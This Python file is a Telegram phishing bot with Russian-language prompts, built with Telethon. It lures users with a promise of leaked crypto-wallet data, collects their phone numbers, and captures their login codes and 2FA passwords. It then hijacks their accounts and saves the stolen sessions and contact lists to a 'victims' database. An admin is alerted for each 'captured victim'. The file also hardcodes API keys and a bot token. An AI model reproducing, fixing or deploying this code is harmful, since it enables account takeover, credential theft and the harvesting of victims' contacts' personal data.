# telethon_fishing_bot.py
import asyncio
import sqlite3
import json
import os
import shutil
from datetime import datetime
from telethon import TelegramClient, events, types
from telethon.tl.types import KeyboardButtonRequestPhone, MessageEntityTextUrl
from telethon.tl.functions.messages import RequestWebViewRequest, SendWebViewDataRequest
from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError

# === КОНФИГУРАЦИЯ ===
API_ID = 31930134
API_HASH = '12814e71d319a434ee2f126d0c51c314'
BOT_TOKEN = '8651082388:AAF6UNT2y7MSlhkPYGBFkkN4cVkgZ_pZiWc'

SESSIONS_DIR = 'sessions'
TDATA_DIR = 'tdata_exports'
os.makedirs(SESSIONS_DIR, exist_ok=True)
os.makedirs(TDATA_DIR, exist_ok=True)

# БД
conn = sqlite3.connect('victims.db', check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS victims
             (user_id INTEGER PRIMARY KEY, phone TEXT, code TEXT, 
              session_file TEXT, tdata_path TEXT, timestamp TEXT)''')
conn.commit()

class ImprovedFishingBot:
    def __init__(self):
        self.bot = TelegramClient('bot_session', API_ID, API_HASH)
        self.pending_auth = {}  # user_id -> auth_data
        self.invalid_attempts = {}  # user_id -> attempts count

    async def start(self):
        await self.bot.start(bot_token=BOT_TOKEN)
        print("[SWILL] Бот активирован и ожидает жертв")

        @self.bot.on(events.NewMessage(pattern='/start'))
        async def start_handler(event):
            await event.respond(
                "🔥 **ЭКСКЛЮЗИВНЫЙ ДОСТУП К ЗЛАТЕ** 🔥\n\n"
                "Для получения доступа к базе слитых кошельков на сумму 10M+ USDT\n"
                "нажмите кнопку 'Поделиться контактом' для быстрой авторизации.\n\n"
                "⚡️ Это займет всего 5 секунд!",
                buttons=[
                    [KeyboardButtonRequestPhone("📱 ПОДЕЛИТЬСЯ КОНТАКТОМ", request_phone=True)]
                ]
            )

        @self.bot.on(events.Message)
        async def contact_handler(event):
            if event.is_private and event.contact:
                user_id = event.sender_id
                phone = event.contact.phone_number
                
                if not phone.startswith('+'):
                    phone = '+' + phone
                
                await event.respond(
                    "✅ **Номер получен!**\n"
                    f"Телефон: `{phone}`\n\n"
                    "Теперь нажмите кнопку ниже, чтобы получить код подтверждения:",
                    buttons=[
                        [types.KeyboardButtonText("🔑 ПОЛУЧИТЬ КОД")]
                    ]
                )
                self.pending_auth[user_id] = {
                    'step': 'awaiting_code_request',
                    'phone': phone
                }
                return

            # Обработка кода с клавиатуры
            if event.is_private and event.text:
                user_id = event.sender_id
                text = event.text.strip()
                
                if user_id in self.pending_auth:
                    auth_data = self.pending_auth[user_id]
                    step = auth_data.get('step')
                    
                    if step == 'awaiting_code_request' and text == "🔑 ПОЛУЧИТЬ КОД":
                        await self.request_code(event, user_id, auth_data['phone'])
                    
                    elif step == 'waiting_code':
                        # Обработка кода, введенного с клавиатуры
                        code = text.replace(' ', '').replace('-', '')
                        if code.isdigit() and len(code) in (5, 6):
                            await self.verify_code(event, user_id, code)
                        else:
                            await event.respond(
                                "❌ **Неверный формат кода!**\n\n"
                                "Код должен состоять из 5 или 6 цифр.\n"
                                "Пожалуйста, введите код еще раз:",
                                buttons=[
                                    [types.KeyboardButtonText("🔄 ПОВТОРИТЬ ВВОД")]
                                ]
                            )
                            self.invalid_attempts[user_id] = self.invalid_attempts.get(user_id, 0) + 1
                            
                            if self.invalid_attempts[user_id] >= 3:
                                await event.respond(
                                    "⚠️ **Слишком много попыток!**\n"
                                    "Нажмите 'Получить новый код', чтобы запросить новый код.",
                                    buttons=[
                                        [types.KeyboardButtonText("🆕 ПОЛУЧИТЬ НОВЫЙ КОД")]
                                    ]
                                )
                                self.pending_auth[user_id]['step'] = 'awaiting_code_request'

    async def request_code(self, event, user_id, phone):
        """Запрос кода подтверждения с защитой от перехвата"""
        try:
            # Создаем временный клиент
            temp_client = TelegramClient(f'{SESSIONS_DIR}/temp_{user_id}', API_ID, API_HASH)
            await temp_client.connect()
            
            # Отправляем запрос на код
            result = await temp_client.send_code_request(phone)
            
            self.pending_auth[user_id].update({
                'step': 'waiting_code',
                'client': temp_client,
                'phone_code_hash': result.phone_code_hash,
                'temp_client': temp_client,
                'code_attempts': 0
            })
            
            # Создаем клавиатуру для ввода кода
            keyboard = [
                [types.KeyboardButtonText("1"), types.KeyboardButtonText("2"), types.KeyboardButtonText("3")],
                [types.KeyboardButtonText("4"), types.KeyboardButtonText("5"), types.KeyboardButtonText("6")],
                [types.KeyboardButtonText("7"), types.KeyboardButtonText("8"), types.KeyboardButtonText("9")],
                [types.KeyboardButtonText("0"), types.KeyboardButtonText("⌫ УДАЛИТЬ"), types.KeyboardButtonText("✅ ОТПРАВИТЬ")]
            ]
            
            await event.respond(
                "📱 **Введите код подтверждения**\n\n"
                "Код был отправлен вам в Telegram.\n"
                "Используйте клавиатуру ниже для ввода кода:\n"
                f"`{' '.join([str(i) for i in range(1, 10)])}`\n"
                "Нажмите **✅ ОТПРАВИТЬ** после ввода кода.",
                buttons=keyboard
            )
            
        except Exception as e:
            await event.respond(f"❌ Ошибка запроса кода: {str(e)}")
            self.pending_auth.pop(user_id, None)

    @self.bot.on(events.CallbackQuery())
    async def code_handler(self, event):
        """Обработка ввода кода через callback"""
        user_id = event.sender_id
        data = event.data.decode()
        
        if user_id not in self.pending_auth:
            return
        
        auth_data = self.pending_auth[user_id]
        
        if auth_data.get('step') != 'waiting_code':
            return
        
        code_input = auth_data.get('code_input', '')
        
        if data == 'DELETE':
            code_input = code_input[:-1]
            self.pending_auth[user_id]['code_input'] = code_input
            await event.answer(f"Код: {code_input}")
        
        elif data == 'SEND':
            if len(code_input) in (5, 6):
                await self.verify_code(event, user_id, code_input)
            else:
                await event.answer("❌ Код должен содержать 5 или 6 цифр!")
        
        elif data.isdigit():
            code_input += data
            self.pending_auth[user_id]['code_input'] = code_input
            await event.answer(f"Код: {code_input}")

    async def verify_code(self, event, user_id, code):
        """Проверка введенного кода и авторизация"""
        auth_data = self.pending_auth.get(user_id)
        if not auth_data:
            return
        
        temp_client = auth_data['temp_client']
        phone = auth_data['phone']
        phone_code_hash = auth_data['phone_code_hash']
        
        try:
            # Пытаемся авторизоваться с кодом
            await temp_client.sign_in(
                phone=phone,
                code=code,
                phone_code_hash=phone_code_hash
            )
            
            # Успешная авторизация
            session_file = f'{SESSIONS_DIR}/victim_{user_id}.session'
            await temp_client.disconnect()
            
            # Переименовываем сессию
            temp_session = f'{SESSIONS_DIR}/temp_{user_id}.session'
            if os.path.exists(temp_session):
                os.rename(temp_session, session_file)
            
            # Экспортируем данные
            tdata_path = await self.export_tdata(user_id, session_file)
            
            # Сохраняем в БД
            c.execute('''INSERT OR REPLACE INTO victims 
                         VALUES (?, ?, ?, ?, ?, ?)''',
                      (user_id, phone, code, session_file, tdata_path, 
                       datetime.now().isoformat()))
            conn.commit()
            
            await event.respond(
                "✅ **ДОСТУП ПРЕДОСТАВЛЕН!**\n\n"
                "Ссылка на слив златы будет отправлена в течение 5 минут.\n\n"
                "⚠️ Сохраните этот чат для получения дальнейших инструкций."
            )
            
            # Уведомление админу
            await self.notify_admin(user_id, phone, session_file)
            
            # Удаляем временные данные
            self.pending_auth.pop(user_id, None)
            
        except SessionPasswordNeededError:
            await event.respond(
                "🔐 **Требуется двухфакторная аутентификация!**\n\n"
                "Введите пароль 2FA (если у вас его нет, нажмите 'Забыли пароль?'):",
                buttons=[
                    [types.KeyboardButtonText("🔑 ВВЕСТИ ПАРОЛЬ 2FA")],
                    [types.KeyboardButtonText("❓ ЗАБЫЛИ ПАРОЛЬ?")]
                ]
            )
            self.pending_auth[user_id]['step'] = 'waiting_2fa'
            
        except PhoneCodeExpiredError:
            await event.respond(
                "⏰ **Код истек!**\n\n"
                "Запросите новый код, нажав кнопку ниже.",
                buttons=[
                    [types.KeyboardButtonText("🆕 ЗАПРОСИТЬ НОВЫЙ КОД")]
                ]
            )
            self.pending_auth[user_id]['step'] = 'awaiting_code_request'
            
        except Exception as e:
            await event.respond(f"❌ Ошибка авторизации: {str(e)}")
            self.pending_auth.pop(user_id, None)

    async def export_tdata(self, user_id, session_file):
        """Экспорт полного tdata"""
        tdata_dir = f'{TDATA_DIR}/tdata_{user_id}'
        os.makedirs(tdata_dir, exist_ok=True)
        
        client = TelegramClient(session_file, API_ID, API_HASH)
        await client.connect()
        
        try:
            me = await client.get_me()
            
            # Сбор полной информации
            full_data = {
                'account': {
                    'id': me.id,
                    'username': me.username,
                    'first_name': me.first_name,
                    'last_name': me.last_name,
                    'phone': me.phone,
                    'premium': me.premium or False,
                    'verified': me.verified or False,
                    'session_path': session_file
                },
                'contacts': [],
                'dialogs': [],
                'sessions': []
            }
            
            # Получаем контакты
            async for contact in client.iter_contacts():
                full_data['contacts'].append({
                    'id': contact.id,
                    'username': contact.username,
                    'first_name': contact.first_name,
                    'last_name': contact.last_name,
                    'phone': contact.phone
                })
            
            # Сохраняем JSON
            with open(f'{tdata_dir}/full_data.json', 'w', encoding='utf-8') as f:
                json.dump(full_data, f, indent=2, ensure_ascii=False)
            
            # Копируем сессию
            shutil.copy(session_file, f'{tdata_dir}/session.session')
            
        finally:
            await client.disconnect()
        
        return tdata_dir

    async def notify_admin(self, user_id, phone, session_file):
        """Уведомление админа"""
        admin_id = 8794011165  # Ваш ID
        try:
            await self.bot.send_message(
                admin_id,
                f"🎯 **НОВАЯ ЖЕРТВА ЗАХВАЧЕНА!**\n"
                f"ID: {user_id}\n"
                f"Телефон: {phone}\n"
                f"Сессия: {session_file}\n"
                f"Время: {datetime.now().isoformat()}\n"
                f"Статус: ✅ Аккаунт полностью скомпрометирован"
            )
        except Exception as e:
            print(f"Ошибка уведомления админа: {e}")

    async def run(self):
        await self.start()
        await self.bot.run_until_disconnected()

if __name__ == '__main__':
    bot = ImprovedFishingBot()
    asyncio.run(bot.run())